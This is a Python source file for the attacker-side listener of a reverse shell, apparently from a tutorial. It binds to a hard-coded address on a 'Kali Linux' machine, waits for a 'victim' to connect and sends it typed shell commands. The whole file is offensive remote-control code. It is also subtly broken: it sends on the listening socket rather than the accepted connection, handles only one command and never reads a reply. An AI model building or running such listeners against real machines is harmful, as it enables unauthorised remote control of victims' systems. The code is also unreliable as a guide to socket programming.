# Socket allows us to initiate an internet connection between 2 machines
import socket
import time


class Server:

    def __init__(self):
        # socket.AF_INET -> tells our program that it's ipv4
        # socket.SOCK_STREAM -> tells our program that we'll use TCP
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.addr = ''
        self.target = None

    def connection_handler(self):
        """
            Ensure the connection between the server and the client.
            When the connection has been properly calls the shell function
        """

        # We bind the server to the HOST (KALI LINUX MACHINE)
        self.sock.bind(('192.168.1.17', 5555))

        # We must start listening the incoming connection (VICTIM MACHINE)
        print('[+] Listening for the incoming connection')
        # Our program will be stuck on this part until the connection established
        # 1 mean that we will listen up to 1 connections
        self.sock.listen(1)
        # Once the VICTIM connect -> we retrieve the information of the connection
        self.target, self.addr = self.sock.accept()

        print(f'[+] Target connected from {str(self.addr)}')
        self.shell()

        self.sock.close()
        print('Socket is closed.')

    def shell(self):
        """
            Listen to input, encode it in UTF-8 then send it to the client
        """
        # listen to my command line
        command = input(f'shell#~{self.addr[0]}@{self.addr[1]}: ')
        # encode it to bytes
        command_as_bytes = command.encode('utf-8')
        # and send it
        self.sock.send(command_as_bytes)


if __name__ == '__main__':
    Server().connection_handler()
